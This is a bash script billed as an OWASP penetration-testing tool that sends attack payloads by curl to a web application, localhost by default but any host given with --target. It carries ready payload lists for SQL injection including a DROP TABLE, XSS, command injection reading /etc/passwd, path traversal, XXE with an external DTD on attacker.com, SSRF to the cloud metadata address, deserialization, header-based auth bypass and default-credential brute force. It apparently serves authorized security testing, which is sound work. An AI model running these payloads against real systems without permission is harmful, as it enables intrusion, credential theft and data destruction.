#!/bin/bash

# OWASP Professional Penetration Testing CLI Tool
# Ferramenta CLI Profissional de Pentest OWASP
# Version: 1.0.0
# Author: ATous Security Team
# Description: Comprehensive penetration testing tool for security assessment

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Configuration
TARGET_HOST="localhost"
TARGET_PORT="8000"
BASE_URL="http://${TARGET_HOST}:${TARGET_PORT}"
OUTPUT_DIR="./pentest_results"
LOG_FILE="${OUTPUT_DIR}/pentest.log"
REPORT_FILE="${OUTPUT_DIR}/security_report.html"
TEST_RESULTS="${OUTPUT_DIR}/test_results.json"

# Create output directory
mkdir -p "$OUTPUT_DIR"

# Initialize log
echo "[$(date)] OWASP Pentest Tool Started" > "$LOG_FILE"

# Function to log messages
log_message() {
    local level=$1
    local message=$2
    echo "[$(date)] [$level] $message" >> "$LOG_FILE"
    echo -e "${CYAN}[$(date)]${NC} ${YELLOW}[$level]${NC} $message"
}

# Function to check if target is reachable
check_target() {
    log_message "INFO" "Checking target availability: $BASE_URL"
    if curl -s --connect-timeout 5 "$BASE_URL/health" > /dev/null 2>&1; then
        log_message "SUCCESS" "Target is reachable"
        return 0
    else
        log_message "ERROR" "Target is not reachable"
        return 1
    fi
}

# Function to perform SQL Injection tests
sql_injection_tests() {
    log_message "INFO" "Starting SQL Injection Tests"
    
    local payloads=(
        "' OR '1'='1"
        "' OR '1'='1' --"
        "' OR '1'='1' /*"
        "'; DROP TABLE users; --"
        "' UNION SELECT NULL,NULL,NULL --"
        "' UNION SELECT username,password FROM users --"
        "1' AND (SELECT COUNT(*) FROM users) > 0 --"
        "1' AND (SELECT SUBSTRING(@@version,1,1)) = '5' --"
        "1' OR SLEEP(5) --"
        "1'; WAITFOR DELAY '00:00:05' --"
        "' OR 1=1 LIMIT 1 OFFSET 0 --"
        "' OR 'x'='x"
        "admin'--"
        "admin' #"
        "admin'/*"
        "' or 1=1#"
        "' or 1=1--"
        "' or 1=1/*"
        "') or '1'='1--"
        "') or ('1'='1--"
    )
    
    local endpoints=(
        "/auth/login"
        "/api/users"
        "/api/search"
        "/security/validate-input"
    )
    
    for endpoint in "${endpoints[@]}"; do
        for payload in "${payloads[@]}"; do
            log_message "TEST" "Testing SQL Injection on $endpoint with payload: $payload"
            
            # Test in different parameters
            curl -s -X POST "$BASE_URL$endpoint" \
                -H "Content-Type: application/json" \
                -d "{\"username\":\"$payload\",\"password\":\"test\"}" \
                -w "Status: %{http_code}, Time: %{time_total}s\n" >> "$LOG_FILE" 2>&1
            
            curl -s -X GET "$BASE_URL$endpoint?search=$payload" \
                -w "Status: %{http_code}, Time: %{time_total}s\n" >> "$LOG_FILE" 2>&1
            
            sleep 0.1
        done
    done
    
    log_message "INFO" "SQL Injection tests completed"
}

# Function to perform XSS tests
xss_tests() {
    log_message "INFO" "Starting XSS Tests"
    
    local payloads=(
        "<script>alert('XSS')</script>"
        "<img src=x onerror=alert('XSS')>"
        "<svg onload=alert('XSS')>"
        "javascript:alert('XSS')"
        "<iframe src=javascript:alert('XSS')></iframe>"
        "<body onload=alert('XSS')>"
        "<input onfocus=alert('XSS') autofocus>"
        "<select onfocus=alert('XSS') autofocus>"
        "<textarea onfocus=alert('XSS') autofocus>"
        "<keygen onfocus=alert('XSS') autofocus>"
        "<video><source onerror=alert('XSS')>"
        "<audio src=x onerror=alert('XSS')>"
        "<details open ontoggle=alert('XSS')>"
        "<marquee onstart=alert('XSS')>"
        "'><script>alert('XSS')</script>"
        "\"><script>alert('XSS')</script>"
        "</script><script>alert('XSS')</script>"
        "<script>alert(String.fromCharCode(88,83,83))</script>"
        "<script>alert(/XSS/)</script>"
        "<script>alert`XSS`</script>"
    )
    
    local endpoints=(
        "/security/validate-input"
        "/api/search"
        "/api/comments"
    )
    
    for endpoint in "${endpoints[@]}"; do
        for payload in "${payloads[@]}"; do
            log_message "TEST" "Testing XSS on $endpoint with payload: $payload"
            
            # URL encoded payload
            encoded_payload=$(echo -n "$payload" | python3 -c "import urllib.parse; print(urllib.parse.quote(input()))")
            
            curl -s -X POST "$BASE_URL$endpoint" \
                -H "Content-Type: application/json" \
                -d "{\"input_data\":\"$payload\",\"context\":\"html\"}" \
                -w "Status: %{http_code}, Time: %{time_total}s\n" >> "$LOG_FILE" 2>&1
            
            curl -s -X GET "$BASE_URL$endpoint?q=$encoded_payload" \
                -w "Status: %{http_code}, Time: %{time_total}s\n" >> "$LOG_FILE" 2>&1
            
            sleep 0.1
        done
    done
    
    log_message "INFO" "XSS tests completed"
}

# Function to perform Command Injection tests
command_injection_tests() {
    log_message "INFO" "Starting Command Injection Tests"
    
    local payloads=(
        "; ls -la"
        "| ls -la"
        "&& ls -la"
        "|| ls -la"
        "; cat /etc/passwd"
        "| cat /etc/passwd"
        "; whoami"
        "| whoami"
        "; id"
        "| id"
        "; uname -a"
        "| uname -a"
        "; pwd"
        "| pwd"
        "; ps aux"
        "| ps aux"
        "; netstat -an"
        "| netstat -an"
        "\`ls -la\`"
        "\$(ls -la)"
        "\`whoami\`"
        "\$(whoami)"
        "\`id\`"
        "\$(id)"
    )
    
    local endpoints=(
        "/security/validate-input"
        "/api/system"
        "/api/files"
    )
    
    for endpoint in "${endpoints[@]}"; do
        for payload in "${payloads[@]}"; do
            log_message "TEST" "Testing Command Injection on $endpoint with payload: $payload"
            
            curl -s -X POST "$BASE_URL$endpoint" \
                -H "Content-Type: application/json" \
                -d "{\"input_data\":\"$payload\",\"context\":\"system\"}" \
                -w "Status: %{http_code}, Time: %{time_total}s\n" >> "$LOG_FILE" 2>&1
            
            sleep 0.1
        done
    done
    
    log_message "INFO" "Command Injection tests completed"
}

# Function to perform Path Traversal tests
path_traversal_tests() {
    log_message "INFO" "Starting Path Traversal Tests"
    
    local payloads=(
        "../../../etc/passwd"
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
        "....//....//....//etc/passwd"
        "..%2F..%2F..%2Fetc%2Fpasswd"
        "..%252F..%252F..%252Fetc%252Fpasswd"
        "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
        "../../../../../../../etc/passwd"
        "..\\..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
        "/etc/passwd"
        "\\windows\\system32\\drivers\\etc\\hosts"
        "file:///etc/passwd"
        "file://c:/windows/system32/drivers/etc/hosts"
        "..%2f..%2f..%2fetc%2fpasswd"
        "..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts"
    )
    
    local endpoints=(
        "/api/files"
        "/api/download"
        "/api/upload"
        "/security/validate-input"
    )
    
    for endpoint in "${endpoints[@]}"; do
        for payload in "${payloads[@]}"; do
            log_message "TEST" "Testing Path Traversal on $endpoint with payload: $payload"
            
            curl -s -X GET "$BASE_URL$endpoint?file=$payload" \
                -w "Status: %{http_code}, Time: %{time_total}s\n" >> "$LOG_FILE" 2>&1
            
            curl -s -X POST "$BASE_URL/security/validate-input" \
                -H "Content-Type: application/json" \
                -d "{\"input_data\":\"$payload\",\"context\":\"general\"}" \
                -w "Status: %{http_code}, Time: %{time_total}s\n" >> "$LOG_FILE" 2>&1
            
            sleep 0.1
        done
    done
    
    log_message "INFO" "Path Traversal tests completed"
}

# Function to perform LDAP Injection tests
ldap_injection_tests() {
    log_message "INFO" "Starting LDAP Injection Tests"
    
    local payloads=(
        "*"
        "*)(&"
        "*))%00"
        ")(cn=*"
        "*)(uid=*"
        "*)(|(uid=*"
        "*))%00(|(cn=*"
        "admin)(&(password=*"
        "admin))(|(cn=*"
        "*)(objectClass=*"
        "*)(|(objectClass=*"
        "admin*"
        "admin*)((|userPassword=*"
        "*)(userPassword=*"
        "*)(|(userPassword=*"
    )
    
    local endpoints=(
        "/auth/ldap"
        "/api/users/search"
        "/security/validate-input"
    )
    
    for endpoint in "${endpoints[@]}"; do
        for payload in "${payloads[@]}"; do
            log_message "TEST" "Testing LDAP Injection on $endpoint with payload: $payload"
            
            curl -s -X POST "$BASE_URL$endpoint" \
                -H "Content-Type: application/json" \
                -d "{\"username\":\"$payload\",\"password\":\"test\"}" \
                -w "Status: %{http_code}, Time: %{time_total}s\n" >> "$LOG_FILE" 2>&1
            
            curl -s -X POST "$BASE_URL/security/validate-input" \
                -H "Content-Type: application/json" \
                -d "{\"input_data\":\"$payload\",\"context\":\"ldap\"}" \
                -w "Status: %{http_code}, Time: %{time_total}s\n" >> "$LOG_FILE" 2>&1
            
            sleep 0.1
        done
    done
    
    log_message "INFO" "LDAP Injection tests completed"
}

# Function to perform XXE tests
xxe_tests() {
    log_message "INFO" "Starting XXE Tests"
    
    local payloads=(
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">]><foo>&xxe;</foo>'
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/malicious.dtd">]><foo>&xxe;</foo>'
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><foo></foo>'
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>'
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>'
    )
    
    local endpoints=(
        "/api/xml"
        "/api/upload"
        "/security/validate-input"
    )
    
    for endpoint in "${endpoints[@]}"; do
        for payload in "${payloads[@]}"; do
            log_message "TEST" "Testing XXE on $endpoint"
            
            curl -s -X POST "$BASE_URL$endpoint" \
                -H "Content-Type: application/xml" \
                -d "$payload" \
                -w "Status: %{http_code}, Time: %{time_total}s\n" >> "$LOG_FILE" 2>&1
            
            curl -s -X POST "$BASE_URL/security/validate-input" \
                -H "Content-Type: application/json" \
                -d "{\"input_data\":\"$(echo "$payload" | sed 's/"/\\"/g')\",\"context\":\"xml\"}" \
                -w "Status: %{http_code}, Time: %{time_total}s\n" >> "$LOG_FILE" 2>&1
            
            sleep 0.1
        done
    done
    
    log_message "INFO" "XXE tests completed"
}

# Function to perform NoSQL Injection tests
nosql_injection_tests() {
    log_message "INFO" "Starting NoSQL Injection Tests"
    
    local payloads=(
        '{"$ne": null}'
        '{"$gt": ""}'
        '{"$regex": ".*"}'
        '{"$where": "this.username == this.password"}'
        '{"$or": [{"username": "admin"}, {"password": {"$ne": null}}]}'
        '{"username": {"$ne": null}, "password": {"$ne": null}}'
        '{"$and": [{"username": {"$exists": true}}, {"password": {"$exists": true}}]}'
        '{"username": {"$in": ["admin", "administrator", "root"]}}'
        '{"password": {"$regex": "^a"}}'
        '{"$where": "function() { return true; }"}'
    )
    
    local endpoints=(
        "/auth/login"
        "/api/users"
        "/api/search"
        "/security/validate-input"
    )
    
    for endpoint in "${endpoints[@]}"; do
        for payload in "${payloads[@]}"; do
            log_message "TEST" "Testing NoSQL Injection on $endpoint with payload: $payload"
            
            curl -s -X POST "$BASE_URL$endpoint" \
                -H "Content-Type: application/json" \
                -d "{\"username\": $payload, \"password\": \"test\"}" \
                -w "Status: %{http_code}, Time: %{time_total}s\n" >> "$LOG_FILE" 2>&1
            
            curl -s -X POST "$BASE_URL/security/validate-input" \
                -H "Content-Type: application/json" \
                -d "{\"input_data\":\"$(echo "$payload" | sed 's/"/\\"/g')\",\"context\":\"json\"}" \
                -w "Status: %{http_code}, Time: %{time_total}s\n" >> "$LOG_FILE" 2>&1
            
            sleep 0.1
        done
    done
    
    log_message "INFO" "NoSQL Injection tests completed"
}

# Function to perform CSRF tests
csrf_tests() {
    log_message "INFO" "Starting CSRF Tests"
    
    # Test endpoints without CSRF tokens
    local endpoints=(
        "/api/users"
        "/api/settings"
        "/api/admin"
        "/security/middleware/block-ip"
    )
    
    for endpoint in "${endpoints[@]}"; do
        log_message "TEST" "Testing CSRF on $endpoint"
        
        # Test POST without CSRF token
        curl -s -X POST "$BASE_URL$endpoint" \
            -H "Content-Type: application/json" \
            -d '{"test": "csrf"}' \
            -w "Status: %{http_code}, Time: %{time_total}s\n" >> "$LOG_FILE" 2>&1
        
        # Test PUT without CSRF token
        curl -s -X PUT "$BASE_URL$endpoint" \
            -H "Content-Type: application/json" \
            -d '{"test": "csrf"}' \
            -w "Status: %{http_code}, Time: %{time_total}s\n" >> "$LOG_FILE" 2>&1
        
        # Test DELETE without CSRF token
        curl -s -X DELETE "$BASE_URL$endpoint" \
            -w "Status: %{http_code}, Time: %{time_total}s\n" >> "$LOG_FILE" 2>&1
        
        sleep 0.1
    done
    
    log_message "INFO" "CSRF tests completed"
}

# Function to perform Authentication Bypass tests
auth_bypass_tests() {
    log_message "INFO" "Starting Authentication Bypass Tests"
    
    local headers=(
        "X-Forwarded-For: 127.0.0.1"
        "X-Real-IP: 127.0.0.1"
        "X-Originating-IP: 127.0.0.1"
        "X-Remote-IP: 127.0.0.1"
        "X-Client-IP: 127.0.0.1"
        "Authorization: Bearer fake_token"
        "Authorization: Basic YWRtaW46YWRtaW4="
        "X-User-ID: 1"
        "X-Admin: true"
        "X-Role: admin"
    )
    
    local protected_endpoints=(
        "/api/admin"
        "/security/middleware/stats"
        "/security/security-report"
        "/api/users"
    )
    
    for endpoint in "${protected_endpoints[@]}"; do
        for header in "${headers[@]}"; do
            log_message "TEST" "Testing Auth Bypass on $endpoint with header: $header"
            
            curl -s -X GET "$BASE_URL$endpoint" \
                -H "$header" \
                -w "Status: %{http_code}, Time: %{time_total}s\n" >> "$LOG_FILE" 2>&1
            
            sleep 0.1
        done
    done
    
    log_message "INFO" "Authentication Bypass tests completed"
}

# Function to perform Rate Limiting tests
rate_limiting_tests() {
    log_message "INFO" "Starting Rate Limiting Tests"
    
    local endpoints=(
        "/auth/login"
        "/api/search"
        "/security/validate-input"
    )
    
    for endpoint in "${endpoints[@]}"; do
        log_message "TEST" "Testing Rate Limiting on $endpoint"
        
        # Send 100 rapid requests
        for i in {1..100}; do
            curl -s -X POST "$BASE_URL$endpoint" \
                -H "Content-Type: application/json" \
                -d '{"test": "rate_limit"}' \
                -w "Request $i - Status: %{http_code}, Time: %{time_total}s\n" >> "$LOG_FILE" 2>&1 &
        done
        
        wait
        sleep 1
    done
    
    log_message "INFO" "Rate Limiting tests completed"
}

# Function to perform SSRF tests
ssrf_tests() {
    log_message "INFO" "Starting SSRF Tests"
    
    local payloads=(
        "http://127.0.0.1:22"
        "http://localhost:3306"
        "http://169.254.169.254/latest/meta-data/"
        "file:///etc/passwd"
        "ftp://127.0.0.1"
        "gopher://127.0.0.1:25"
        "dict://127.0.0.1:11211"
        "http://0.0.0.0:8000"
        "http://[::1]:22"
        "http://127.1:80"
        "http://2130706433:80"
        "http://017700000001:80"
        "http://0x7f000001:80"
    )
    
    local endpoints=(
        "/api/fetch"
        "/api/webhook"
        "/api/proxy"
        "/security/validate-input"
    )
    
    for endpoint in "${endpoints[@]}"; do
        for payload in "${payloads[@]}"; do
            log_message "TEST" "Testing SSRF on $endpoint with payload: $payload"
            
            curl -s -X POST "$BASE_URL$endpoint" \
                -H "Content-Type: application/json" \
                -d "{\"url\":\"$payload\"}" \
                -w "Status: %{http_code}, Time: %{time_total}s\n" >> "$LOG_FILE" 2>&1
            
            curl -s -X POST "$BASE_URL/security/validate-input" \
                -H "Content-Type: application/json" \
                -d "{\"input_data\":\"$payload\",\"context\":\"url\"}" \
                -w "Status: %{http_code}, Time: %{time_total}s\n" >> "$LOG_FILE" 2>&1
            
            sleep 0.1
        done
    done
    
    log_message "INFO" "SSRF tests completed"
}

# Function to perform Insecure Deserialization tests
deserialization_tests() {
    log_message "INFO" "Starting Insecure Deserialization Tests"
    
    local payloads=(
        'O:8:"stdClass":1:{s:4:"test";s:4:"evil";}'
        'rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABdAAEdGVzdHQABGV2aWx4'
        '{"__class__": "subprocess.Popen", "args": ["ls", "-la"]}'
        'aced0005737200116a6176612e7574696c2e486173684d61700507daa1c41660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000c770800000010000000017400047465737474000465766978'
    )
    
    local endpoints=(
        "/api/deserialize"
        "/api/session"
        "/api/cache"
        "/security/validate-input"
    )
    
    for endpoint in "${endpoints[@]}"; do
        for payload in "${payloads[@]}"; do
            log_message "TEST" "Testing Deserialization on $endpoint"
            
            curl -s -X POST "$BASE_URL$endpoint" \
                -H "Content-Type: application/octet-stream" \
                -d "$payload" \
                -w "Status: %{http_code}, Time: %{time_total}s\n" >> "$LOG_FILE" 2>&1
            
            curl -s -X POST "$BASE_URL/security/validate-input" \
                -H "Content-Type: application/json" \
                -d "{\"input_data\":\"$(echo "$payload" | base64 -w 0)\",\"context\":\"general\"}" \
                -w "Status: %{http_code}, Time: %{time_total}s\n" >> "$LOG_FILE" 2>&1
            
            sleep 0.1
        done
    done
    
    log_message "INFO" "Insecure Deserialization tests completed"
}

# Function to perform Security Headers tests
security_headers_tests() {
    log_message "INFO" "Starting Security Headers Tests"
    
    local endpoints=(
        "/"
        "/api/health"
        "/docs"
        "/security/middleware/stats"
    )
    
    for endpoint in "${endpoints[@]}"; do
        log_message "TEST" "Testing Security Headers on $endpoint"
        
        response=$(curl -s -I "$BASE_URL$endpoint" 2>/dev/null)
        
        # Check for security headers
        echo "$response" | grep -i "x-frame-options" >> "$LOG_FILE" || echo "Missing X-Frame-Options header on $endpoint" >> "$LOG_FILE"
        echo "$response" | grep -i "x-content-type-options" >> "$LOG_FILE" || echo "Missing X-Content-Type-Options header on $endpoint" >> "$LOG_FILE"
        echo "$response" | grep -i "x-xss-protection" >> "$LOG_FILE" || echo "Missing X-XSS-Protection header on $endpoint" >> "$LOG_FILE"
        echo "$response" | grep -i "strict-transport-security" >> "$LOG_FILE" || echo "Missing Strict-Transport-Security header on $endpoint" >> "$LOG_FILE"
        echo "$response" | grep -i "content-security-policy" >> "$LOG_FILE" || echo "Missing Content-Security-Policy header on $endpoint" >> "$LOG_FILE"
        echo "$response" | grep -i "referrer-policy" >> "$LOG_FILE" || echo "Missing Referrer-Policy header on $endpoint" >> "$LOG_FILE"
        
        sleep 0.1
    done
    
    log_message "INFO" "Security Headers tests completed"
}

# Function to perform Brute Force tests
brute_force_tests() {
    log_message "INFO" "Starting Brute Force Tests"
    
    local usernames=("admin" "administrator" "root" "user" "test" "guest" "demo")
    local passwords=("admin" "password" "123456" "admin123" "root" "test" "guest" "demo" "password123" "admin@123")
    
    for username in "${usernames[@]}"; do
        for password in "${passwords[@]}"; do
            log_message "TEST" "Testing Brute Force with $username:$password"
            
            curl -s -X POST "$BASE_URL/auth/login" \
                -H "Content-Type: application/json" \
                -d "{\"username\":\"$username\",\"password\":\"$password\"}" \
                -w "Status: %{http_code}, Time: %{time_total}s\n" >> "$LOG_FILE" 2>&1
            
            sleep 0.2
        done
    done
    
    log_message "INFO" "Brute Force tests completed"
}

# Function to generate HTML report
generate_report() {
    log_message "INFO" "Generating security report"
    
    cat > "$REPORT_FILE" << EOF
<!DOCTYPE html>
<html>
<head>
    <title>OWASP Penetration Test Report</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        .header { background-color: #2c3e50; color: white; padding: 20px; text-align: center; }
        .section { margin: 20px 0; padding: 15px; border: 1px solid #ddd; }
        .critical { background-color: #e74c3c; color: white; }
        .high { background-color: #e67e22; color: white; }
        .medium { background-color: #f39c12; color: white; }
        .low { background-color: #27ae60; color: white; }
        .info { background-color: #3498db; color: white; }
        pre { background-color: #f8f9fa; padding: 10px; overflow-x: auto; }
        .timestamp { color: #666; font-size: 0.9em; }
    </style>
</head>
<body>
    <div class="header">
        <h1>OWASP Penetration Test Report</h1>
        <p>Target: $BASE_URL</p>
        <p class="timestamp">Generated: $(date)</p>
    </div>
    
    <div class="section">
        <h2>Executive Summary</h2>
        <p>This report contains the results of a comprehensive penetration test performed against the target application.</p>
        <p>The test covered the following attack vectors:</p>
        <ul>
            <li>SQL Injection</li>
            <li>Cross-Site Scripting (XSS)</li>
            <li>Command Injection</li>
            <li>Path Traversal</li>
            <li>LDAP Injection</li>
            <li>XML External Entity (XXE)</li>
            <li>NoSQL Injection</li>
            <li>Cross-Site Request Forgery (CSRF)</li>
            <li>Authentication Bypass</li>
            <li>Rate Limiting</li>
            <li>Server-Side Request Forgery (SSRF)</li>
            <li>Insecure Deserialization</li>
            <li>Security Headers</li>
            <li>Brute Force Attacks</li>
        </ul>
    </div>
    
    <div class="section">
        <h2>Test Results</h2>
        <p>Detailed test results can be found in the log file: <code>$LOG_FILE</code></p>
        <p>Total tests performed: $(grep -c "\[TEST\]" "$LOG_FILE" 2>/dev/null || echo "0")</p>
        <p>Errors detected: $(grep -c "Status: 5" "$LOG_FILE" 2>/dev/null || echo "0")</p>
        <p>Suspicious responses: $(grep -c "Status: 4" "$LOG_FILE" 2>/dev/null || echo "0")</p>
    </div>
    
    <div class="section">
        <h2>Recommendations</h2>
        <ul>
            <li>Implement input validation and sanitization</li>
            <li>Use parameterized queries to prevent SQL injection</li>
            <li>Implement proper output encoding to prevent XSS</li>
            <li>Use CSRF tokens for state-changing operations</li>
            <li>Implement proper authentication and authorization</li>
            <li>Add rate limiting to prevent brute force attacks</li>
            <li>Implement security headers</li>
            <li>Use secure deserialization practices</li>
            <li>Validate and sanitize file paths</li>
            <li>Implement proper error handling</li>
        </ul>
    </div>
    
    <div class="section">
        <h2>Log Summary</h2>
        <pre>$(tail -50 "$LOG_FILE" 2>/dev/null || echo "No log data available")</pre>
    </div>
</body>
</html>
EOF
    
    log_message "SUCCESS" "Report generated: $REPORT_FILE"
}

# Function to show help
show_help() {
    echo -e "${BLUE}OWASP Professional Penetration Testing CLI Tool${NC}"
    echo -e "${CYAN}Usage: $0 [OPTIONS]${NC}"
    echo ""
    echo "Options:"
    echo "  -h, --help              Show this help message"
    echo "  -t, --target HOST:PORT  Set target (default: localhost:8000)"
    echo "  -o, --output DIR        Set output directory (default: ./pentest_results)"
    echo "  -a, --all               Run all tests (default)"
    echo "  --sql                   Run SQL injection tests only"
    echo "  --xss                   Run XSS tests only"
    echo "  --cmd                   Run command injection tests only"
    echo "  --path                  Run path traversal tests only"
    echo "  --ldap                  Run LDAP injection tests only"
    echo "  --xxe                   Run XXE tests only"
    echo "  --nosql                 Run NoSQL injection tests only"
    echo "  --csrf                  Run CSRF tests only"
    echo "  --auth                  Run authentication bypass tests only"
    echo "  --rate                  Run rate limiting tests only"
    echo "  --ssrf                  Run SSRF tests only"
    echo "  --deser                 Run deserialization tests only"
    echo "  --headers               Run security headers tests only"
    echo "  --brute                 Run brute force tests only"
    echo "  --check                 Check target availability only"
    echo ""
    echo "Examples:"
    echo "  $0 --target example.com:8080 --all"
    echo "  $0 --sql --xss"
    echo "  $0 --check"
}

# Main function
main() {
    local run_all=true
    local run_sql=false
    local run_xss=false
    local run_cmd=false
    local run_path=false
    local run_ldap=false
    local run_xxe=false
    local run_nosql=false
    local run_csrf=false
    local run_auth=false
    local run_rate=false
    local run_ssrf=false
    local run_deser=false
    local run_headers=false
    local run_brute=false
    local check_only=false
    
    # Parse command line arguments
    while [[ $# -gt 0 ]]; do
        case $1 in
            -h|--help)
                show_help
                exit 0
                ;;
            -t|--target)
                if [[ -n $2 ]]; then
                    TARGET_HOST=$(echo "$2" | cut -d: -f1)
                    TARGET_PORT=$(echo "$2" | cut -d: -f2)
                    BASE_URL="http://${TARGET_HOST}:${TARGET_PORT}"
                    shift 2
                else
                    echo "Error: --target requires a value"
                    exit 1
                fi
                ;;
            -o|--output)
                if [[ -n $2 ]]; then
                    OUTPUT_DIR="$2"
                    LOG_FILE="${OUTPUT_DIR}/pentest.log"
                    REPORT_FILE="${OUTPUT_DIR}/security_report.html"
                    mkdir -p "$OUTPUT_DIR"
                    shift 2
                else
                    echo "Error: --output requires a value"
                    exit 1
                fi
                ;;
            -a|--all)
                run_all=true
                shift
                ;;
            --sql)
                run_all=false
                run_sql=true
                shift
                ;;
            --xss)
                run_all=false
                run_xss=true
                shift
                ;;
            --cmd)
                run_all=false
                run_cmd=true
                shift
                ;;
            --path)
                run_all=false
                run_path=true
                shift
                ;;
            --ldap)
                run_all=false
                run_ldap=true
                shift
                ;;
            --xxe)
                run_all=false
                run_xxe=true
                shift
                ;;
            --nosql)
                run_all=false
                run_nosql=true
                shift
                ;;
            --csrf)
                run_all=false
                run_csrf=true
                shift
                ;;
            --auth)
                run_all=false
                run_auth=true
                shift
                ;;
            --rate)
                run_all=false
                run_rate=true
                shift
                ;;
            --ssrf)
                run_all=false
                run_ssrf=true
                shift
                ;;
            --deser)
                run_all=false
                run_deser=true
                shift
                ;;
            --headers)
                run_all=false
                run_headers=true
                shift
                ;;
            --brute)
                run_all=false
                run_brute=true
                shift
                ;;
            --check)
                check_only=true
                shift
                ;;
            *)
                echo "Unknown option: $1"
                show_help
                exit 1
                ;;
        esac
    done
    
    # Display banner
    echo -e "${PURPLE}"
    echo "  ██████╗ ██╗    ██╗ █████╗ ███████╗██████╗ "
    echo " ██╔═══██╗██║    ██║██╔══██╗██╔════╝██╔══██╗"
    echo " ██║   ██║██║ █╗ ██║███████║███████╗██████╔╝"
    echo " ██║   ██║██║███╗██║██╔══██║╚════██║██╔═══╝ "
    echo " ╚██████╔╝╚███╔███╔╝██║  ██║███████║██║     "
    echo "  ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═╝╚══════╝╚═╝     "
    echo -e "${NC}"
    echo -e "${CYAN}Professional Penetration Testing Tool${NC}"
    echo -e "${YELLOW}Target: $BASE_URL${NC}"
    echo -e "${YELLOW}Output: $OUTPUT_DIR${NC}"
    echo ""
    
    # Check target availability
    if ! check_target; then
        echo -e "${RED}Target is not reachable. Exiting.${NC}"
        exit 1
    fi
    
    if [[ $check_only == true ]]; then
        echo -e "${GREEN}Target check completed successfully.${NC}"
        exit 0
    fi
    
    # Run tests based on options
    if [[ $run_all == true ]]; then
        log_message "INFO" "Starting comprehensive penetration test"
        sql_injection_tests
        xss_tests
        command_injection_tests
        path_traversal_tests
        ldap_injection_tests
        xxe_tests
        nosql_injection_tests
        csrf_tests
        auth_bypass_tests
        rate_limiting_tests
        ssrf_tests
        deserialization_tests
        security_headers_tests
        brute_force_tests
    else
        [[ $run_sql == true ]] && sql_injection_tests
        [[ $run_xss == true ]] && xss_tests
        [[ $run_cmd == true ]] && command_injection_tests
        [[ $run_path == true ]] && path_traversal_tests
        [[ $run_ldap == true ]] && ldap_injection_tests
        [[ $run_xxe == true ]] && xxe_tests
        [[ $run_nosql == true ]] && nosql_injection_tests
        [[ $run_csrf == true ]] && csrf_tests
        [[ $run_auth == true ]] && auth_bypass_tests
        [[ $run_rate == true ]] && rate_limiting_tests
        [[ $run_ssrf == true ]] && ssrf_tests
        [[ $run_deser == true ]] && deserialization_tests
        [[ $run_headers == true ]] && security_headers_tests
        [[ $run_brute == true ]] && brute_force_tests
    fi
    
    # Generate report
    generate_report
    
    echo -e "${GREEN}Penetration test completed!${NC}"
    echo -e "${CYAN}Results saved to: $OUTPUT_DIR${NC}"
    echo -e "${CYAN}Log file: $LOG_FILE${NC}"
    echo -e "${CYAN}HTML report: $REPORT_FILE${NC}"
    
    log_message "INFO" "Penetration test completed successfully"
}

# Run main function with all arguments
main "$@"